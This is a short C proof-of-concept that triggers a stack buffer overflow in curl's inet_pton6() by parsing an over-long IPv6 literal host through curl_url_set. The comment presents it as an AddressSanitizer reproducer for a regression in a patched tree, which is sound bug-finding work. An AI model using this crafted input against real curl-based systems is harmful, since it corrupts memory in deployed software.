/* PoC: overflow of the 16-byte stack buffer in inet_pton6() reached through
 * the public curl_url API when parsing an over-long IPv6 literal host.
 * Fires under AddressSanitizer on the patched tree; the parent rejects the
 * same input cleanly (return 0) without touching out-of-bounds memory. */
#include <curl/curl.h>

int main(void)
{
  CURLU *u = curl_url();
  if(!u)
    return 2;
  (void)curl_url_set(u, CURLUPART_URL,
                     "http://[1:2:3:4:5:6:7:8:9:a]/", 0);
  curl_url_cleanup(u);
  return 0;
}
